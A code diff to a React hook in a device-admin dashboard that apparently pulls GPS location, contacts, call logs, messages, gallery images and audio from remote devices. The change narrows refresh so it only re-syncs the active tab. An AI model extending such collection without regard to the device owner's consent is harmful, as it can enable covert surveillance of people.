@@ -7,7 +7,7 @@ import { AudioCapture } from "@/components/admin/devices/DeviceAudioGallery";
 import { createClient } from "@/lib/supabase/client";
 import { useDeviceActions } from "@/components/admin/devices/useDeviceActions";
 import { toast } from "@/components/ui/Toast";
-import { getCommandWaitMessage } from "@/lib/device-tab-meta";
+import { getCommandWaitMessage, getTabMeta } from "@/lib/device-tab-meta";
 
 const CACHE_TTL = 300000; // 5 minutes per Rule 12
 const tabCache = new Map<string, { data: any; time: number }>();
@@ -175,25 +175,21 @@ export function useDeviceDetail(deviceId: string, checkTabEnabled?: (tab: string
     device, locations, contacts, calls, messages, captures, audioClips, files, filesLoading, tabLoading, appCount,
     activeTab, setActiveTab, loading, isRefreshing, toast: null, isLiveMovement,
     handleFullRefresh: async () => {
-      setIsRefreshing(true); toast.request("Refreshing GPS & enabled tabs...");
-      tabCache.clear(); sendCommand("fetch_location", {}, "Fresh GPS");
-      const syncMap: Record<string, string> = { contacts: "sync_contacts", calls: "sync_calls", messages: "sync_messages", apps: "sync_apps", gallery: "sync_gallery" };
-      const tasks: Promise<any>[] = [fetchLightStatus()];
-      for (const [tab, cmd] of Object.entries(syncMap)) {
-        if (checkTabEnabled && checkTabEnabled(tab)) {
-          sendCommand(cmd, {}, `Sync ${tab}`);
-          tasks.push(fetchTabData(tab, true, true));
-        }
+      setIsRefreshing(true);
+      tabCache.delete(`${deviceId}:${activeTab}`);
+      await fetchLightStatus();
+      const meta = getTabMeta(activeTab);
+      if (meta.cmd && (!checkTabEnabled || checkTabEnabled(activeTab))) {
+        toast.request(meta.waitMsg, 7000);
+        sendCommand(meta.cmd, {}, meta.name, true);
+        await fetchTabData(activeTab, true, true);
+      } else {
+        await fetchTabData(activeTab, true, true);
+        toast.success(`Refreshed ${meta.name}`);
       }
-      await Promise.all(tasks);
-      setTimeout(() => {
-        fetchLightStatus();
-        for (const tab of Object.keys(syncMap)) {
-          if (checkTabEnabled && checkTabEnabled(tab)) fetchTabData(tab, true, true);
-        }
-      }, 2500);
-      toast.success("Fresh GPS & data requested"); setIsRefreshing(false);
+      setIsRefreshing(false);
     },
+    fetchLightStatus,
     fetchTabData, handleToggleLiveMovement, sendCommand, ...actions,
   };
 }
